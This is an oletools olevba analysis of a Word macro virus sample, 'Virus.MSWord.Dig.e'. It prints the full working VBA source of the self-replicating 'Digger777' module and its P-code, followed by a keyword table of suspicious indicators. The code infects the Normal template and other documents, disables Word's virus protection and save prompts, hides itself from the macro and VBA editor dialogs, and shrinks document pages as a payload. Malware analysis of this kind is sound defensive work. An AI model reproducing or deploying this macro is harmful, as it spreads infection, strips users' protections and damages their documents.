olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dig.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dig.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Digger777.bas 
in file: Virus.MSWord.Dig.e - OLE stream: 'Macros/VBA/Digger777'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 1999 by dd!Actor.
'All rights reserved.
'Patch in 2001 by GremMe & ZerGo.

Sub AutoOpen()
RunMeAldays
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean

pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "Digger777" Then
        NInst = 1
        dc(i).Export pth
    End If
Next i

Set dc = ActiveDocument.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "Digger777" Then
        AInst = 1
        dc(i).Export pth
    End If
Next i

If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
    dc.VBProject.VBComponents.Import pth
    If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
    Kill pth
End If

End Sub

Sub AutoExec()
    RunMeAldays
End Sub

Sub AutoExit()
    Options.VirusProtection = 1
End Sub

Sub FileSave()
On Error Resume Next
    AutoOpen
    RunMeAldays
    Pricol
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    AutoOpen
    RunMeAldays
    Pricol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub ToolsOptions()
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte

On Error Resume Next

Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show

Set dc = ActiveDocument.VBProject.VBComponents("Digger777").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1

dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat

Set dc = NormalTemplate.VBProject.VBComponents("Digger777").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat

Options.SaveNormalPrompt = 0
Options.VirusProtection = 0

NormalTemplate.Save
NormalTemplate.Saved = True
End Sub

Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object

On Error Resume Next

pth = Environ("temp") & "\~WRD000^.tmp"

Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject

GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject

GoSub 10
AInst = res

If NInst = True Then
    Set dc = dcN
    GoSub 20
    Nsav = NormalTemplate.Saved
    NormalTemplate.Saved = 1
End If

If AInst = True Then
    Set dc = dcA
    GoSub 20
    Asav = ActiveDocument.Saved
    ActiveDocument.Saved = 1
End If

Dialogs(wdDialogToolsMacro).Show

dcN("Digger777").CodeModule.AddFromFile pth
dcA("Digger777").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth

NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth

ActiveDocument.Saved = Asav
Kill pth
Exit Sub

10:
For i = 1 To dc.VBComponents.Count
    If dc.VBComponents(i).Name = "Digger777" Then
        res = 1
        dc.VBComponents(i).Export pth
    End If
Next i
Return

20:
dc.Export pth
n = dc("Digger777").CodeModule.CountOfLines
dc("Digger777").CodeModule.DeleteLines 1, n
Return

End Sub
Sub ViewVBCode()
If Dir("c:\autoexec.bat") <> "" Then
    If FileLen("c:\autoexec.bat") <> 777 Then
        RunMeAldays
        Pricol
        Exit Sub
        Else
            Application.VBE.MainWindow.Visible = True
    End If
End If
End Sub
Sub RunMeAldays()

    Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Application.VBE.MainWindow.Visible = False

End Sub

Sub Pricol()
    ActiveDocument.PageSetup.RightMargin = 0.63
    ActiveDocument.PageSetup.TopMargin = 0.63
    ActiveDocument.PageSetup.LeftMargin = 0
    ActiveDocument.PageSetup.BottomMargin = 0
    
    ActiveDocument.PageSetup.PageWidth = InchesToPoints(0.6)
    ActiveDocument.PageSetup.PageHeight = InchesToPoints(0.6)
    
    ActiveDocument.UndoClear
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dig.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Digger777 - 8479 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn NStat
' Line #2:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn VStat
' Line #3:
' 	QuoteRem 0x0000 0x001D "Copyright © 1999 by dd!Actor."
' Line #4:
' 	QuoteRem 0x0000 0x0014 "All rights reserved."
' Line #5:
' 	QuoteRem 0x0000 0x0020 "Patch in 2001 by GremMe & ZerGo."
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	ArgsCall RunMeAldays 0x0000 
' Line #9:
' 	Dim 
' 	VarDefn pth (As String)
' 	VarDefn i (As Byte)
' 	VarDefn dc (As Object)
' Line #10:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' Line #11:
' Line #12:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRD000^.tmp"
' 	Concat 
' 	St pth 
' Line #13:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #14:
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #16:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Digger777"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	St NInst 
' Line #18:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' Line #22:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Digger777"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	St AInst 
' Line #27:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' Line #31:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set dc 
' 	EndIf 
' Line #32:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' 	EndIf 
' Line #33:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #34:
' 	Ld pth 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #36:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Sub AutoExec())
' Line #42:
' 	ArgsCall RunMeAldays 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Sub AutoExit())
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Sub FileSave())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall AutoOpen 0x0000 
' Line #52:
' 	ArgsCall RunMeAldays 0x0000 
' Line #53:
' 	ArgsCall Pricol 0x0000 
' Line #54:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Sub FileSaveAs())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	ArgsCall AutoOpen 0x0000 
' Line #60:
' 	ArgsCall RunMeAldays 0x0000 
' Line #61:
' 	ArgsCall Pricol 0x0000 
' Line #62:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub ToolsOptions())
' Line #66:
' 	Dim 
' 	VarDefn dc (As Object)
' Line #67:
' 	Dim 
' 	VarDefn VirStat (As Byte)
' Line #68:
' 	Dim 
' 	VarDefn NorStat (As Byte)
' Line #69:
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' Line #72:
' 	Ld NStat 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #73:
' 	Ld VStat 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #74:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #75:
' Line #76:
' 	SetStmt 
' 	LitStr 0x0009 "Digger777"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #77:
' 	Ld Options 
' 	MemLd SaveNormalPrompt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St NorStat 
' 	EndIf 
' Line #78:
' 	Ld Options 
' 	MemLd VirusProtection 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St VirStat 
' 	EndIf 
' Line #79:
' Line #80:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #81:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #82:
' Line #83:
' 	SetStmt 
' 	LitStr 0x0009 "Digger777"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #84:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #85:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #86:
' Line #87:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #88:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #89:
' Line #90:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub ToolsMacro())
' Line #95:
' 	Dim 
' 	VarDefn i (As Byte)
' 	VarDefn n (As Integer)
' 	VarDefn pth (As String)
' Line #96:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' 	VarDefn Nsav (As Boolean)
' 	VarDefn Asav (As Boolean)
' 	VarDefn res (As Boolean)
' Line #97:
' 	Dim 
' 	VarDefn dc (As Object)
' 	VarDefn dcN (As Object)
' 	VarDefn dcA (As Object)
' Line #98:
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' Line #101:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRD000^.tmp"
' 	Concat 
' 	St pth 
' Line #102:
' Line #103:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcN 
' Line #104:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcA 
' Line #105:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set dc 
' Line #106:
' Line #107:
' 	GoSub 10 
' Line #108:
' 	Ld res 
' 	St NInst 
' Line #109:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set dc 
' Line #110:
' Line #111:
' 	GoSub 10 
' Line #112:
' 	Ld res 
' 	St AInst 
' Line #113:
' Line #114:
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #115:
' 	SetStmt 
' 	Ld dcN 
' 	Set dc 
' Line #116:
' 	GoSub 20 
' Line #117:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Nsav 
' Line #118:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #119:
' 	EndIfBlock 
' Line #120:
' Line #121:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #122:
' 	SetStmt 
' 	Ld dcA 
' 	Set dc 
' Line #123:
' 	GoSub 20 
' Line #124:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Asav 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #126:
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #129:
' Line #130:
' 	Ld pth 
' 	LitStr 0x0009 "Digger777"
' 	ArgsLd dcN 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #131:
' 	Ld pth 
' 	LitStr 0x0009 "Digger777"
' 	ArgsLd dcA 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #132:
' 	Ld pth 
' 	Ld dcN 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #133:
' Line #134:
' 	Ld Nsav 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #135:
' 	Ld pth 
' 	Ld dcA 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #136:
' Line #137:
' 	Ld Asav 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #138:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #139:
' 	ExitSub 
' Line #140:
' Line #141:
' 	LineNum 10 
' 	BoS 0x0000 
' Line #142:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #143:
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Digger777"
' 	Eq 
' 	IfBlock 
' Line #144:
' 	LitDI2 0x0001 
' 	St res 
' Line #145:
' 	Ld pth 
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	Return 
' Line #149:
' Line #150:
' 	LineNum 20 
' 	BoS 0x0000 
' Line #151:
' 	Ld pth 
' 	Ld dc 
' 	ArgsMemCall Export 0x0001 
' Line #152:
' 	LitStr 0x0009 "Digger777"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld n 
' 	LitStr 0x0009 "Digger777"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #154:
' 	Return 
' Line #155:
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub ViewVBCode())
' Line #158:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #159:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x0309 
' 	Ne 
' 	IfBlock 
' Line #160:
' 	ArgsCall RunMeAldays 0x0000 
' Line #161:
' 	ArgsCall Pricol 0x0000 
' Line #162:
' 	ExitSub 
' Line #163:
' 	ElseBlock 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub RunMeAldays())
' Line #169:
' Line #170:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #171:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #172:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #173:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #175:
' Line #176:
' 	EndSub 
' Line #177:
' Line #178:
' 	FuncDefn (Sub Pricol())
' Line #179:
' 	LitR8 0x5C29 0xC28F 0x28F5 0x3FE4 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt RightMargin 
' Line #180:
' 	LitR8 0x5C29 0xC28F 0x28F5 0x3FE4 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt TopMargin 
' Line #181:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt LeftMargin 
' Line #182:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt BottomMargin 
' Line #183:
' Line #184:
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	ArgsLd InchesToPoints 0x0001 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt PageWidth 
' Line #185:
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	ArgsLd InchesToPoints 0x0001 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemSt PageHeight 
' Line #186:
' Line #187:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #188:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

